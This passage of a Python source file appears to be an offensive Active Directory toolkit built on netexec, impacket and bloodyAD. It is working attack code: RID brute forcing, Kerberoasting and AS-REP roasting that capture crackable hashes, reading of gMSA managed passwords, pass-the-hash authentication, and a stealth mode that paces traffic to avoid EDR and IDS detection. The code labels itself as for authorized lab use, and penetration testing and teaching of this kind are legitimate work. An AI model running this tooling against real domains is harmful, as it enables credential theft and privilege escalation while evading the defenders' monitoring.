    VulnModule("printnightmare", "printnightmare", "smb", True, Sev.HIGH,
               "CVE-2021-1675/34527 (PrintNightmare)", "printnightmare",
               "Print Spooler flaw allowing RCE / privilege escalation."),
    VulnModule("spooler", "spooler", "smb", True, Sev.MEDIUM,
               "Print Spooler service enabled", "spooler",
               "The Spooler service being reachable enables coercion attacks "
               "(PrinterBug) and some RCE paths."),
    VulnModule("smbghost", "smbghost", "smb", False, Sev.HIGH,
               "CVE-2020-0796 (SMBGhost)", "smbghost",
               "A compression flaw in SMBv3.1.1 allowing pre-auth RCE on "
               "unpatched Windows 10 / Server 2004/1903/1909."),
    VulnModule("ldap-checker", "ldap-checker", "ldap", True, Sev.MEDIUM,
               "LDAP signing / channel binding not enforced", "ldapsigning",
               "If LDAP signing and channel binding are not required, captured "
               "or coerced NTLM authentication can be relayed to LDAP(S)."),
    VulnModule("maq", "maq", "ldap", True, Sev.INFO,
               "ms-DS-MachineAccountQuota", "maq",
               "The number of machine accounts any user may add. A non-zero "
               "value is a prerequisite for noPac and RBCD attacks."),
]

NXC_VULN_KEYS = [m.key for m in NXC_VULN_MODULES]

# Modules that send recognisable exploit/coercion signatures and are the most
# likely to trip an EDR or IDS. Quiet mode skips these unless named explicitly.
NOISY_VULN_KEYS = {"ms17-010", "zerologon", "nopac", "petitpotam",
                   "printnightmare", "spooler", "smbghost"}


def _is_vulnerable(output: str) -> bool:
    """Heuristic: does netexec module output indicate the target is vulnerable?"""
    low = output.lower()
    negatives = ("not vulnerable", "isn't vulnerable", "is not vulnerable",
                 "not be vulnerable", "appears patched")
    if any(n in low for n in negatives):
        return False
    return ("vulnerable" in low) or ("pwn3d" in low)


def run_nxc_vuln(nxc: str, mod: VulnModule, creds: Creds, dry_run: bool) -> None:
    section(f"Vuln check: {mod.key} ({mod.cve})")
    if mod.needs_creds and creds.is_anonymous:
        warn(f"Skipping '{mod.key}': requires valid credentials.")
        REPORT.add_f("Vulnerabilities", Sev.INFO,
                     f"{mod.key}: not checked (needs credentials)",
                     ref=REFS.get(mod.ref_key, ""))
        return
    cmd = _nxc_base(nxc, creds, mod.proto) + ["-M", mod.module]
    code, out = run(cmd, dry_run)
    if dry_run:
        return
    if _is_vulnerable(out):
        REPORT.add_f("Vulnerabilities", mod.severity,
                     f"POTENTIALLY VULNERABLE: {mod.cve}",
                     details=[f"netexec module: {mod.module}"],
                     explanation=mod.desc + " Confirm manually before relying on it.",
                     ref=REFS.get(mod.ref_key, ""))
    elif mod.key == "maq":
        # maq is informational: surface the quota value if we can see it.
        quota = None
        for ln in _lines(out):
            if "machineaccountquota" in ln.lower():
                digits = [int(t) for t in ln.replace(":", " ").split() if t.isdigit()]
                if digits:
                    quota = digits[-1]
        sev = Sev.MEDIUM if (quota and quota > 0) else Sev.INFO
        REPORT.add_f("Vulnerabilities", sev,
                     f"MachineAccountQuota = {quota if quota is not None else 'unknown'}",
                     explanation=mod.desc, ref=REFS[mod.ref_key])
    else:
        REPORT.add_f("Vulnerabilities", Sev.OK,
                     f"{mod.key}: not reported vulnerable", ref=REFS.get(mod.ref_key, ""))


# -- Standalone checks implemented directly with impacket (no netexec needed) - #
def standalone_smb_checks(creds: Creds) -> None:
    """Check SMB signing and SMBv1 dialect support via impacket directly."""
    if not IMPACKET_AVAILABLE:
        warn("Skipping standalone SMB checks: impacket not installed.")
        return
    try:
        from impacket.smbconnection import SMBConnection
        from impacket.smb import SMB_DIALECT
    except Exception as e:  # pragma: no cover
        warn(f"Skipping standalone SMB checks: {e}")
        return

    section("Standalone: SMB signing & SMBv1 (impacket)")

    # SMB signing requirement.
    try:
        conn = SMBConnection(creds.dc_ip, creds.dc_ip, sess_port=445, timeout=6)
        signing_required = conn.isSigningRequired()
        server_os = conn.getServerOS()
        try:
            conn.logoff()
        except Exception:
            pass
        info(f"Server OS: {server_os}  |  SMB signing required: {signing_required}")
        if signing_required:
            REPORT.add_f("Vulnerabilities", Sev.OK,
                         "SMB signing is required",
                         explanation="Good: NTLM relay to SMB on this host is prevented.",
                         ref=REFS["smbsigning"])
        else:
            REPORT.add_f("Vulnerabilities", Sev.HIGH,
                         "SMB signing NOT required",
                         details=[f"Server OS: {server_os}"],
                         explanation="Authentication coerced or captured from a client can "
                                     "be relayed to this host over SMB (e.g. ntlmrelayx).",
                         ref=REFS["smbsigning"])
    except Exception as e:
        err(f"SMB signing check failed: {e}")

    # SMBv1 dialect support.
    try:
        v1 = SMBConnection(creds.dc_ip, creds.dc_ip, sess_port=445,
                           preferredDialect=SMB_DIALECT, timeout=6)
        try:
            v1.logoff()
        except Exception:
            pass
        good("SMBv1 dialect negotiated successfully.")
        REPORT.add_f("Vulnerabilities", Sev.HIGH,
                     "SMBv1 is enabled",
                     explanation="The legacy SMBv1 protocol is enabled. It is deprecated, "
                                 "insecure, and the attack surface for MS17-010 (EternalBlue).",
                     ref=REFS["smbv1"])
    except Exception:
        info("SMBv1 does not appear to be supported (good).")
        REPORT.add_f("Vulnerabilities", Sev.OK, "SMBv1 not supported",
                     ref=REFS["smbv1"])


def standalone_ldap_checks(creds: Creds, use_ldaps: bool = False) -> None:
    """Check anonymous LDAP bind and read MachineAccountQuota via impacket."""
    if not IMPACKET_AVAILABLE:
        warn("Skipping standalone LDAP checks: impacket not installed.")
        return
    if not creds.domain:
        warn("Skipping standalone LDAP checks: a domain (-d) is required.")
        return

    section("Standalone: anonymous LDAP bind & MachineAccountQuota (impacket)")
    base_dn = ",".join(f"DC={p}" for p in creds.domain.split("."))

    # Anonymous bind.
    try:
        proto = "ldaps" if use_ldaps else "ldap"
        anon = impacket_ldap.LDAPConnection(f"{proto}://{creds.dc_ip}", base_dn, creds.dc_ip)
        anon.login("", "", creds.domain, "", "")
        good("Anonymous LDAP bind accepted.")
        REPORT.add_f("Vulnerabilities", Sev.MEDIUM,
                     "Anonymous LDAP bind allowed",
                     explanation="The DC accepts unauthenticated LDAP binds, exposing "
                                 "directory data to anyone on the network.",
                     ref=REFS["ldap"])
    except Exception:
        info("Anonymous LDAP bind rejected (good).")
        REPORT.add_f("Vulnerabilities", Sev.OK, "Anonymous LDAP bind rejected",
                     ref=REFS["ldap"])

    # MachineAccountQuota (needs an authenticated bind).
    if creds.is_anonymous:
        return
    try:
        enum = LdapEnumerator(creds, use_ldaps=use_ldaps)
        enum.connect()
        results = enum.search("(objectClass=domain)", ["ms-DS-MachineAccountQuota"])
        quota = None
        for item in results:
            a = enum._attrs(item)
            if "ms-DS-MachineAccountQuota" in a:
                quota = a["ms-DS-MachineAccountQuota"][0]
        if quota is not None:
            try:
                qval = int(quota)
            except ValueError:
                qval = -1
            sev = Sev.MEDIUM if qval > 0 else Sev.INFO
            REPORT.add_f("Vulnerabilities", sev,
                         f"ms-DS-MachineAccountQuota = {quota}",
                         explanation="Any authenticated user can add this many machine "
                                     "accounts. A non-zero value enables noPac and RBCD.",
                         ref=REFS["maq"])
            good(f"MachineAccountQuota = {quota}")
    except Exception as e:
        err(f"MachineAccountQuota lookup failed: {e}")


# --------------------------------------------------------------------------- #
#  Subcommand implementations                                                  #
# --------------------------------------------------------------------------- #
def require_impacket() -> bool:
    if not IMPACKET_AVAILABLE:
        err("impacket is required for this action but is not installed.")
        info("Install it with: pip install impacket")
        return False
    return True


def require_netexec() -> str | None:
    nxc = find_netexec()
    if not nxc:
        err("netexec (nxc) is required for this action but was not found in PATH.")
        info("Install it: pipx install netexec   (https://github.com/Pennyw0rth/NetExec)")
    return nxc


def _nxc_base(nxc: str, creds: Creds, proto: str = "smb") -> list[str]:
    cmd = [nxc, proto, creds.dc_ip] + creds.netexec_auth()
    if creds.domain:
        cmd += ["-d", creds.domain]
    return cmd


def require_bloodyad() -> str | None:
    bad = find_bloodyad()
    if not bad:
        err("bloodyAD is required for this action but was not found in PATH.")
        info("Install it: pipx install bloodyAD   (https://github.com/CravateRouge/bloodyAD)")
    return bad


def _bloodyad_base(bad: str, creds: Creds) -> list[str]:
    """
    Build the bloodyAD auth prefix. bloodyAD accepts a password or an NTLM hash
    (LMHASH:NTHASH or NTHASH) via -p, so pass-the-hash works transparently.
    """
    cmd = [bad, "--host", creds.dc_ip]
    if creds.domain:
        cmd += ["-d", creds.domain]
    secret = creds.nthash if creds.nthash else creds.password
    cmd += ["-u", creds.username, "-p", secret]
    return cmd


def cmd_check(args: argparse.Namespace, creds: Creds) -> int:
    section("Credential validation (SMB)")
    nxc = require_netexec()
    if not nxc:
        return 1
    info(f"Testing: {creds.describe()}")
    code, out = run(_nxc_base(nxc, creds), args.dry_run)
    if not args.dry_run:
        parse_cred_check(out, creds)
    return code


def cmd_ldap(args: argparse.Namespace, creds: Creds) -> int:
    if not require_impacket():
        return 1
    if not creds.domain:
        err("LDAP enumeration needs a domain (-d / --domain), e.g. corp.local")
        return 1
    if args.dry_run:
        proto = "ldaps" if args.ldaps else "ldap"
        warn(f"Dry-run: would bind to {proto}://{creds.dc_ip} and query "
             f"{', '.join(args.what or ['users'])}.")
        return 0
    try:
        enum = LdapEnumerator(creds, use_ldaps=args.ldaps)
        enum.connect()
    except Exception as e:
        err(f"LDAP connection failed: {e}")
        if creds.is_anonymous:
            info("Anonymous LDAP binds are often disabled; try valid credentials.")
        REPORT.add_f(
            "LDAP", Sev.INFO, "LDAP bind failed",
            details=[str(e)],
            explanation="If anonymous, this is expected hardening; with creds, check "
                        "the domain/DC values.",
            ref=REFS["ldap"],
        )
        return 1

    targets = args.what or ["users"]
    dispatch = {
        "users": enum.enum_users,
        "groups": enum.enum_groups,
        "computers": enum.enum_computers,
        "spns": enum.enum_spns,
        "asrep": enum.enum_asrep,
        "trusts": enum.enum_trusts,
        "domaininfo": enum.enum_domaininfo,
    }
    if "all" in targets:
        targets = ["domaininfo", "users", "groups", "computers",
                   "spns", "asrep", "trusts"]
    for t in targets:
        dispatch[t]()
    return 0


def cmd_users(args: argparse.Namespace, creds: Creds) -> int:
    section("User enumeration (SMB --users)")
    nxc = require_netexec()
    if not nxc:
        return 1
    code, out = run(_nxc_base(nxc, creds) + ["--users"], args.dry_run)
    if not args.dry_run:
        parse_userlist(out, "SMB --users", REFS["general"])
    return code


def cmd_groups(args: argparse.Namespace, creds: Creds) -> int:
    section("Group enumeration (SMB --groups)")
    nxc = require_netexec()
    if not nxc:
        return 1
    code, out = run(_nxc_base(nxc, creds) + ["--groups"], args.dry_run)
    if not args.dry_run and out.strip():
        REPORT.add_f(
            "Groups", Sev.INFO, "Group enumeration via SMB completed",
            explanation="Cross-reference privileged group membership with your user list.",
            ref=REFS["general"],
        )
    return code


def cmd_shares(args: argparse.Namespace, creds: Creds) -> int:
    section("Share enumeration (SMB --shares)")
    nxc = require_netexec()
    if not nxc:
        return 1
    code, out = run(_nxc_base(nxc, creds) + ["--shares"], args.dry_run)
    if not args.dry_run:
        parse_shares(out)
    return code


def cmd_passpol(args: argparse.Namespace, creds: Creds) -> int:
    section("Password policy (SMB --pass-pol)")
    nxc = require_netexec()
    if not nxc:
        return 1
    code, out = run(_nxc_base(nxc, creds) + ["--pass-pol"], args.dry_run)
    if not args.dry_run:
        parse_passpol(out)
    return code


def cmd_ridbrute(args: argparse.Namespace, creds: Creds) -> int:
    section("RID brute forcing (SMB --rid-brute)")
    nxc = require_netexec()
    if not nxc:
        return 1
    max_rid = args.max_rid
    # RID cycling is one of the loudest checks: a smaller range is much quieter.
    if STEALTH and max_rid == 4000:
        max_rid = 1500
        info(f"Stealth mode: capping RID range to {max_rid} (was 4000).")
    code, out = run(
        _nxc_base(nxc, creds) + ["--rid-brute", str(max_rid)], args.dry_run)
    if not args.dry_run:
        found = parse_userlist(out, "RID brute forcing", REFS["ridbrute"])
        if found and creds.is_anonymous:
            REPORT.add_f(
                "Users", Sev.MEDIUM, "Objects enumerated over an unauthenticated session",
                explanation="RID cycling succeeded without valid credentials - the DC "
                            "leaks domain accounts to anonymous/guest sessions.",
                ref=REFS["ridbrute"],
            )
    return code


def cmd_kerberoast(args: argparse.Namespace, creds: Creds) -> int:
    section("Kerberoasting (impacket GetUserSPNs)")
    if creds.is_anonymous:
        err("Kerberoasting requires valid domain credentials.")
        return 1
    if not creds.domain:
        err("Kerberoasting needs a domain (-d / --domain).")
        return 1
    script = find_impacket_script("GetUserSPNs.py")
    if not script:
        err("GetUserSPNs.py (impacket) not found in PATH. Install: pip install impacket")
        return 1

    principal = creds.user_domain
    if creds.password and not creds.nthash:
        principal = f"{principal}:{creds.password}"
    cmd = [script, principal, "-dc-ip", creds.dc_ip, "-request"]
    request_user = getattr(args, "request_user", "")
    if request_user:
        # Target a single account instead of bulk-requesting every SPN ticket
        # (a burst of RC4 TGS requests / 4769 events is a classic detection).
        cmd += ["-request-user", request_user]
    elif STEALTH:
        warn("Stealth: requesting ALL SPN tickets at once is noisy. Consider "
             "--request-user <account> to request a single ticket.")
    if creds.nthash:
        cmd += ["-hashes", creds.nthash if ":" in creds.nthash else f":{creds.nthash}"]
    if args.output:
        cmd += ["-outputfile", args.output]
    code, out = run(cmd, args.dry_run)
    if not args.dry_run and "$krb5tgs$" in out:
        hashes = [ln for ln in _lines(out) if ln.startswith("$krb5tgs$")]
        REPORT.add_f(
            "Kerberos", Sev.CRITICAL, f"{len(hashes)} Kerberoast TGS hash(es) captured",
            details=[h[:60] + "..." for h in hashes],
            explanation="Crack offline with hashcat mode 13100. A cracked service "
                        "account password is often a direct path to escalation."
                        + (f" Saved to {args.output}." if args.output else ""),
            ref=REFS["kerberoast"],
        )
    return code


def cmd_asreproast(args: argparse.Namespace, creds: Creds) -> int:
    section("AS-REP roasting (impacket GetNPUsers)")
    if not creds.domain:
        err("AS-REP roasting needs a domain (-d / --domain).")
        return 1
    script = find_impacket_script("GetNPUsers.py")
    if not script:
        err("GetNPUsers.py (impacket) not found in PATH. Install: pip install impacket")
        return 1

    userlist = getattr(args, "userlist", "")
    fmt = getattr(args, "format", "hashcat")
    cmd = [script]
    if userlist:
        cmd += [f"{creds.domain}/", "-usersfile", userlist, "-dc-ip", creds.dc_ip,
                "-no-pass", "-request", "-format", fmt]
    else:
        if creds.is_anonymous:
            err("Without a -U/--userlist, AS-REP roasting needs valid credentials.")
            info("Provide a userlist for the unauthenticated technique instead.")
            return 1
        principal = creds.user_domain
        if creds.password and not creds.nthash:
            principal = f"{principal}:{creds.password}"
        cmd += [principal, "-dc-ip", creds.dc_ip, "-request", "-format", fmt]
        if creds.nthash:
            cmd += ["-hashes", creds.nthash if ":" in creds.nthash else f":{creds.nthash}"]
    if args.output:
        cmd += ["-outputfile", args.output]
    code, out = run(cmd, args.dry_run)
    if not args.dry_run and "$krb5asrep$" in out:
        hashes = [ln for ln in _lines(out) if ln.startswith("$krb5asrep$")]
        REPORT.add_f(
            "Kerberos", Sev.CRITICAL, f"{len(hashes)} AS-REP hash(es) captured",
            details=[h[:60] + "..." for h in hashes],
            explanation="Crack offline with hashcat mode 18200. These were retrievable "
                        "because the accounts lack Kerberos pre-authentication."
                        + (f" Saved to {args.output}." if args.output else ""),
            ref=REFS["asreproast"],
        )
    return code


def cmd_vulns(args: argparse.Namespace, creds: Creds) -> int:
    """
    Enumerate known SMB/LDAP vulnerabilities: netexec detection modules plus
    standalone impacket-based checks. Detection only - nothing is exploited.
    """
    selected = args.checks or ["all"]
    run_all = "all" in selected
    # In quiet/passive mode, drop the noisy exploit-signature modules unless the
    # user explicitly named one (naming it is treating it as opt-in).
    quiet = STEALTH or getattr(args, "passive", False)
    explicitly_named = set(selected) & NOISY_VULN_KEYS
    if quiet and run_all:
        info("Quiet mode: skipping noisy exploit-signature modules "
             f"({', '.join(sorted(NOISY_VULN_KEYS))}). Name one to force it.")

    # Standalone checks (impacket, no netexec dependency).
    do_standalone = run_all or "standalone" in selected
    if do_standalone and not args.dry_run:
        standalone_smb_checks(creds)
        standalone_ldap_checks(creds, use_ldaps=getattr(args, "ldaps", False))
    elif do_standalone and args.dry_run:
        warn("Dry-run: would run standalone SMB (signing, SMBv1) and LDAP "
             "(anon bind, MAQ) checks via impacket.")

    # netexec module checks.
    nxc = find_netexec()
    if not nxc:
        warn("netexec not found; skipping module-based vuln checks "
             "(standalone checks still run).")
        return 0

    for mod in NXC_VULN_MODULES:
        wanted = run_all or mod.key in selected
        if not wanted:
            continue
        # Skip noisy modules in quiet mode unless this one was named explicitly.
        if quiet and mod.key in NOISY_VULN_KEYS and mod.key not in explicitly_named:
            continue
        run_nxc_vuln(nxc, mod, creds, args.dry_run)
    return 0


def cmd_writable(args: argparse.Namespace, creds: Creds) -> int:
    """List objects/attributes the current principal can modify (bloodyAD DACL view)."""
    section("Writable objects (bloodyAD get writable)")
    if creds.is_anonymous:
        err("'writable' needs valid credentials (it checks YOUR effective rights).")
        return 1
    bad = require_bloodyad()
    if not bad:
        return 1
    cmd = _bloodyad_base(bad, creds) + ["get", "writable", "--detail"]
    if getattr(args, "include_del", False):
        cmd += ["--include-del"]
    code, out = run(cmd, args.dry_run)
    if args.dry_run:
        return code
    # bloodyAD prints a block per object; distinguishedName lines mark each target.
    targets = [ln.split(":", 1)[1].strip()
               for ln in _lines(out) if ln.lower().startswith("distinguishedname")]
    targets = sorted(set(targets))
    if targets:
        REPORT.add_f(
            "ACLs", Sev.HIGH, f"{len(targets)} object(s) writable by {creds.username}",
            details=targets[:25] + (["..."] if len(targets) > 25 else []),
            explanation="Write access over these objects can be abused for privilege "
                        "escalation (e.g. targeted Kerberoast, shadow credentials, RBCD, "
                        "password reset, group membership).",
            ref=REFS["writable"],
        )
    elif out.strip():
        REPORT.add_f("ACLs", Sev.INFO, "No writable objects reported for this principal",
                     ref=REFS["writable"])
    return code


def cmd_dns(args: argparse.Namespace, creds: Creds) -> int:
    """Dump AD-integrated DNS (ADIDNS) records (bloodyAD get dnsDump)."""
    section("ADIDNS dump (bloodyAD get dnsDump)")
    if creds.is_anonymous:
        err("'dns' needs valid credentials to read the AD-integrated DNS zone.")
        return 1
    bad = require_bloodyad()
    if not bad:
        return 1
    cmd = _bloodyad_base(bad, creds) + ["get", "dnsDump"]
    code, out = run(cmd, args.dry_run)
    if args.dry_run:
        return code
    records = [ln.split(":", 1)[1].strip()
               for ln in _lines(out) if ln.lower().startswith("recordname")]
    wildcard = [r for r in records if "*" in r]
    if records:
        REPORT.add_f(
            "DNS", Sev.INFO, f"{len(records)} ADIDNS record(s) dumped",
            details=records[:25] + (["..."] if len(records) > 25 else []),
            explanation="Internal DNS records map hostnames to IPs and reveal the internal "
                        "network layout - useful for picking further targets.",
            ref=REFS["dns"],
        )
    if wildcard:
        REPORT.add_f(
            "DNS", Sev.MEDIUM, f"{len(wildcard)} wildcard DNS record(s)",
            details=wildcard,
            explanation="Wildcard records can enable name-resolution hijacking / spoofing.",
            ref=REFS["dns"],
        )
    return code


def cmd_gmsa(args: argparse.Namespace, creds: Creds) -> int:
    """
    Enumerate Group Managed Service Accounts (impacket LDAP) and attempt to read
    their managed passwords (bloodyAD). Readable gMSA passwords are a direct win.
    """
    section("gMSA accounts & managed passwords")
    if not require_impacket():
        return 1
    if not creds.domain or creds.is_anonymous:
        err("'gmsa' needs a domain (-d) and valid credentials.")
        return 1
    if args.dry_run:
        warn("Dry-run: would list msDS-GroupManagedServiceAccount objects via LDAP "
             "and read msDS-ManagedPassword for each via bloodyAD.")
        return 0
    try:
        enum = LdapEnumerator(creds, use_ldaps=getattr(args, "ldaps", False))
        enum.connect()
        accounts = enum.list_gmsa()
    except Exception as e:
        err(f"gMSA enumeration failed: {e}")
        return 1

    if not accounts:
        good("No gMSA accounts found.")
        REPORT.add_f("gMSA", Sev.INFO, "No Group Managed Service Accounts present",
                     ref=REFS["gmsa"])
        return 0

    for acc in accounts:
        print(f"  {C.GREEN}{acc}{C.RESET}")
    REPORT.add_f("gMSA", Sev.INFO, f"{len(accounts)} gMSA account(s) found",
                 details=accounts, ref=REFS["gmsa"])

    bad = find_bloodyad()
    if not bad:
        warn("bloodyAD not found; listed gMSA accounts but cannot read passwords.")
        info("Install bloodyAD to attempt msDS-ManagedPassword reads.")
        return 0

    readable: list[str] = []
    for acc in accounts:
        section(f"Reading managed password: {acc}")
        cmd = _bloodyad_base(bad, creds) + ["get", "object", acc, "--attr",
                                            "msDS-ManagedPassword"]
        _, out = run(cmd, args.dry_run)
        low = out.lower()
        if "managedpassword" in low and not any(
            x in low for x in ("error", "denied", "access_denied", "not readable")
        ):
            readable.append(acc)
    if readable:
        REPORT.add_f(
            "gMSA", Sev.CRITICAL, f"{len(readable)} gMSA managed password(s) readable",
            details=readable,
            explanation="Your principal can read these gMSA passwords (via "
                        "msDS-GroupMSAMembership). That yields the account's NT hash "
                        "and its privileges directly.",
            ref=REFS["gmsa"],
        )
    return 0


def cmd_all(args: argparse.Namespace, creds: Creds) -> int:
    info(f"Target DC     : {creds.dc_ip}")
    info(f"Domain        : {creds.domain or '(unknown)'}")
    info(f"Credentials   : {creds.describe()}")

    cmd_check(args, creds)
    cmd_passpol(args, creds)
    cmd_shares(args, creds)
    cmd_users(args, creds)
    cmd_groups(args, creds)
    cmd_ridbrute(args, creds)

    if IMPACKET_AVAILABLE and creds.domain:
        args.what = ["all"]
        args.ldaps = getattr(args, "ldaps", False)
        cmd_ldap(args, creds)
        if not creds.is_anonymous:
            cmd_kerberoast(args, creds)
            cmd_asreproast(args, creds)
            # bloodyAD-powered reads (only if the tool is available).
            if find_bloodyad():
                args.include_del = False
                cmd_writable(args, creds)
                cmd_dns(args, creds)
                cmd_gmsa(args, creds)
            else:
                info("bloodyAD not found; skipping writable/dns/gmsa reads.")

    if getattr(args, "vuln_scan", False):
        args.checks = ["all"]
        cmd_vulns(args, creds)
    else:
        info("Skipping vulnerability checks (pass --vuln-scan to include them, "
             "or run the 'vulns' subcommand).")

    return 0


# --------------------------------------------------------------------------- #
#  Argument parsing                                                            #
# --------------------------------------------------------------------------- #
def add_common_auth(parser: argparse.ArgumentParser) -> None:
    g = parser.add_argument_group("target & authentication")
    g.add_argument("-t", "--dc-ip", required=True, help="IP address of the Domain Controller")
    g.add_argument("-d", "--domain", default="", help="AD domain FQDN, e.g. corp.local")
    g.add_argument("-u", "--username", default="", help="Username to authenticate as")
    g.add_argument("-p", "--password", default="", help="Password (omit to be prompted)")
    g.add_argument("-H", "--hashes", default="",
                   help="NTLM hash for pass-the-hash, format LMHASH:NTHASH or :NTHASH")
    g.add_argument("--null", action="store_true",
                   help="Use a null/anonymous session (no username or password)")
    g.add_argument("--no-ask-password", dest="ask_password", action="store_false",
                   help="Never prompt interactively for a password")
    g.add_argument("--dry-run", action="store_true",
                   help="Print the external commands that would run, without executing them")
    g.add_argument("--no-color", action="store_true", help="Disable coloured output")
    g.add_argument("--no-report", action="store_true",
                   help="Skip the LinPEAS-style summary report at the end")

    q = parser.add_argument_group("quiet mode (opt-in, for firewalled / monitored labs)")
    q.add_argument("--delay", type=float, default=0.0, metavar="SEC",
                   help="Fixed wait before every request, to spread out traffic")
    q.add_argument("--jitter", type=float, default=0.0, metavar="SEC",
                   help="Add a random 0..SEC wait on top of --delay (less regular timing)")
    q.add_argument("--stealth", action="store_true",
                   help="Quieter profile: sensible delay+jitter if unset, smaller RID "
                        "range, prefer LDAPS, and skip the noisy exploit-signature vuln "
                        "modules unless you name them explicitly")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="ADEnumToolkit.py",
        description="Educational Active Directory enumeration toolkit. "
                    "FOR AUTHORIZED LAB / LEARNING USE ONLY.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
examples:
  # Validate a set of credentials
  ADEnumToolkit.py check -t 10.10.10.10 -d corp.local -u jdoe -p 'Passw0rd!'

  # Enumerate users over a guest/null session
  ADEnumToolkit.py users -t 10.10.10.10 --null
  ADEnumToolkit.py users -t 10.10.10.10 -u guest -p ''

  # RID brute forcing (great when --users is blocked)
  ADEnumToolkit.py rid-brute -t 10.10.10.10 --null --max-rid 5000

  # Direct LDAP enumeration (users/groups/computers/spns/asrep)
  ADEnumToolkit.py ldap -t 10.10.10.10 -d corp.local -u jdoe -p pass --what all

  # Kerberoasting and AS-REP roasting
  ADEnumToolkit.py kerberoast -t 10.10.10.10 -d corp.local -u jdoe -p pass
  ADEnumToolkit.py asreproast -t 10.10.10.10 -d corp.local -U users.txt

  # Full initial recon pass with a LinPEAS-style report at the end
  ADEnumToolkit.py all -t 10.10.10.10 -d corp.local -u jdoe -p pass
""",
    )
    sub = parser.add_subparsers(dest="command", required=True, metavar="<command>")

    specs = [
        ("check", "Validate credentials against the DC (SMB)", cmd_check),
        ("users", "Enumerate domain users (SMB, works with null/guest)", cmd_users),
        ("groups", "Enumerate domain groups (SMB)", cmd_groups),
        ("shares", "Enumerate SMB shares and permissions", cmd_shares),
        ("pass-pol", "Dump the domain password policy (SMB)", cmd_passpol),
        ("rid-brute", "Brute force RIDs to enumerate objects (SMB)", cmd_ridbrute),
        ("ldap", "Direct LDAP enumeration via impacket", cmd_ldap),
        ("kerberoast", "Request TGS hashes for SPN accounts (impacket)", cmd_kerberoast),
        ("asreproast", "Request AS-REP hashes for no-preauth accounts (impacket)", cmd_asreproast),
        ("vulns", "Enumerate known SMB/LDAP vulnerabilities (detection only)", cmd_vulns),
        ("writable", "List objects writable by the current principal (bloodyAD)", cmd_writable),
        ("dns", "Dump AD-integrated DNS records (bloodyAD)", cmd_dns),
        ("gmsa", "Enumerate gMSA accounts and read managed passwords (bloodyAD)", cmd_gmsa),
        ("all", "Run a full initial enumeration pass", cmd_all),
    ]
    subparsers: dict[str, argparse.ArgumentParser] = {}
    for name, help_text, func in specs:
        p = sub.add_parser(name, help=help_text, description=help_text)
        add_common_auth(p)
        p.set_defaults(func=func)
        subparsers[name] = p

    subparsers["rid-brute"].add_argument("--max-rid", type=int, default=4000,
                                         help="Highest RID to enumerate (default: 4000)")
    subparsers["all"].add_argument("--max-rid", type=int, default=4000,
                                   help="Highest RID for the RID-brute step (default: 4000)")
    for name in ("ldap", "vulns", "gmsa", "all"):
        subparsers[name].add_argument("--ldaps", action="store_true",
                                      help="Use LDAPS (TCP 636) instead of LDAP (TCP 389)")
    subparsers["writable"].add_argument(
        "--include-del", action="store_true",
        help="Also include deleted/related objects in the writable check")
    subparsers["vulns"].add_argument(
        "--checks", nargs="+",
        choices=NXC_VULN_KEYS + ["standalone", "all"],
        help="Which vulnerability checks to run (default: all). "
             "'standalone' = impacket-only checks (SMB signing/SMBv1, LDAP bind/MAQ)")
    subparsers["vulns"].add_argument(
        "--passive", action="store_true",
        help="Skip the noisy exploit-signature modules (like --stealth, but only "
             "affects which vuln checks run)")
    subparsers["all"].add_argument(
        "--vuln-scan", action="store_true",
        help="Also run the known-vulnerability checks during the full pass")
    subparsers["ldap"].add_argument(
        "--what", nargs="+",
        choices=["users", "groups", "computers", "spns", "asrep",
                 "trusts", "domaininfo", "all"],
        help="Which LDAP objects to enumerate (default: users)")
    for name in ("kerberoast", "asreproast", "all"):
        subparsers[name].add_argument("-o", "--output", default="",
                                      help="Write recovered hashes to this file")
    subparsers["kerberoast"].add_argument(
        "--request-user", default="",
        help="Request a TGS for only this account (quieter than roasting every SPN)")
    subparsers["asreproast"].add_argument("-U", "--userlist", default="",
                                          help="Username list for unauthenticated AS-REP roasting")
    subparsers["asreproast"].add_argument("--format", choices=["hashcat", "john"],
                                          default="hashcat", help="Hash format (default: hashcat)")
    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    if getattr(args, "no_color", False):
        C.disable()

    banner()

    # Configure pacing / quiet mode.
    global _DELAY, _JITTER, STEALTH
    STEALTH = getattr(args, "stealth", False)
    _DELAY = args.delay
    _JITTER = args.jitter
    if STEALTH:
        # Only fill in sensible pacing defaults if the user didn't set their own.
        if _DELAY == 0.0:
            _DELAY = 1.5
        if _JITTER == 0.0:
            _JITTER = 2.5
        # Prefer the encrypted LDAP channel where the command supports it.
        if hasattr(args, "ldaps") and not args.ldaps:
            args.ldaps = True
        info(f"Stealth mode: delay={_DELAY}s jitter={_JITTER}s, LDAPS preferred, "
             f"noisy vuln modules skipped unless named.")

    creds = Creds(args)
    REPORT.target = creds.dc_ip
    REPORT.domain = creds.domain
    REPORT.creds = creds.describe()

    try:
        code = args.func(args, creds)
    except KeyboardInterrupt:
        print()
        warn("Interrupted.")
        code = 130

    if not getattr(args, "no_report", False):
        REPORT.render()
    return code


if __name__ == "__main__":
    sys.exit(main())
